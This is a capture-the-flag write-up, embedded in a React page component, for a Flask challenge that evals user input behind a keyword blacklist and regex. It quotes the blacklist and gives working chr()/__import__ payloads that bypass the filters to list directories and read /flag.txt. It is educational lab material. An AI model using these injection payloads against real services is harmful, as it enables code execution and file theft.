'use client';

import WriteupTemplate from '@/components/WriteupTemplate';

export default function EvalWriteup() {
  const writeupData = {
    title: '3v@l',
    category: 'Web Exploitation',
    points: 'n/a',
    author: 'Kelvin Creighton',
    difficulty: 'medium' as const,
    tags: ['web', 'eval', 'python', 'flask', 'rce'],
    flag: 'picoCTF{...}',
    sections: [
      {
        title: 'Research',
        cards: [
          {
            title: 'Why eval is dangerous?',
            items: [
              'Executes a string as code.',
              'What more is to be said honestly. (at least for this challenge)',
            ],
          },
        ],
      },
      {
        title: 'Information Gathering',
        prose: "Taking a look at the HTML in the Inspector section in the Developer Tools we find this hint:",
        notice: "TODO\n------------\nSecure python_flask eval execution by \n    1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind\n    2.Implementing regex: r'0x[0-9A-Fa-f]+|\\\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.'",
        steps: [
          {
            number: '01',
            label: 'Breaking Down the Regex',
            prose: "If we break down the regex, which has many parts split by the | (or) operator, we can see what it will and will not match with:\n\n- `0x[0-9A-Fa-f]+`: One or more hexadecimal digits (0–9, A–F, a–f).\n- `\\\\u[0-9A-Fa-f]{4}`: Literally \\u (the regex has \\\\u so it matches one backslash + u). Exactly four hex digits.\n- `%[0-9A-Fa-f]{2}`: Literally %. Exactly two hex digits.\n- `\\.[A-Za-z0-9]{1,3}\\b`: Literal dot. 1 to 3 alphanumeric characters. Word boundary.\n- `[\\\\\\/]`: Matches either a backslash \\ or a forward slash /.\n- `\\.\\.`: Matches .. (two dots).",
          },
          {
            number: '02',
            label: 'Analyzing Matches vs Non-Matches',
            prose: "Examples of what Matches and Doesn't Match:\n\n- Hex literal: Matches `0xFF`, Doesn't Match `0x`\n- Unicode escape: Matches `\\u0041`, Doesn't Match `\\u123`\n- Percent encoding: Matches `%20`, Doesn't Match `%2`\n- File extension: Matches `.js`, Doesn't Match `.jpeg`\n- Double dot: Matches `..`, Doesn't Match `...`\n\nNotice that underscores are also not blacklisted. This will come in handy later...",
          },
        ],
      },
      {
        title: 'Creating the Payload',
        prose: "We know we can't use the `ls` command. However, there may still be a way to run a 'list directories' using `os.listdir()`. The problem is that the keyword `os` is also blacklisted.",
        steps: [
          {
            number: '01',
            label: 'Bypassing the Keyword Blacklist',
            input: `chr(111)+chr(115)`,
            output: `os`,
            reason: '<strong>Reason:</strong> A trick we can use is through the `chr()` function to evaluate the letters. This outputs `os`, but it is still just a string object.',
          },
          {
            number: '02',
            label: 'Importing the `os` Module',
            input: `__import__(chr(111)+chr(115)).listdir()`,
            output: `['app.py', 'static', 'templates']`,
            reason: "<strong>Reason:</strong> This is equivalent to `__import__('os').listdir()`. It allows us to list the current directory contents.",
          },
          {
            number: '03',
            label: 'Exploring the Root Directory',
            input: `__import__(chr(111)+chr(115)).listdir(chr(47))`,
            output: `['flag.txt', ...]`,
            reason: "<strong>Reason:</strong> Now we dig around and find the `flag.txt` file in the `/` directory. We use `chr(47)` to represent the forward slash `/` since it's blacklisted by the regex.",
          },
          {
            number: '04',
            label: 'Reading the Flag',
            input: `open(chr(47)+'flag.'+chr(116)+'xt').read()`,
            output: `[Flag Content]`,
            reason: "<strong>Reason:</strong> We need to open and read the file. But remember we are restricted with the regex (`/` is blacklisted along with any 1-3 letters after a dot). So instead we use `chr()` again to thwart the regex blacklist. A more robust solution would be `__import__('builtins').open(chr(47)+'flag.'+chr(116)+'xt').read()`.",
          },
        ],
      },
      {
        title: 'Key Takeaways',
        cards: [
          {
            title: '',
            items: [
              'Do not use `eval()` on user-supplied input. It leads to Remote Code Execution.',
              'Blacklists and regex filters are often insufficient to prevent code execution because attackers can obfuscate or build the payloads using built-in functions like `chr()` and dynamic imports.',
            ],
          },
        ],
      },
    ],
  };

  return <WriteupTemplate data={writeupData} />;
}
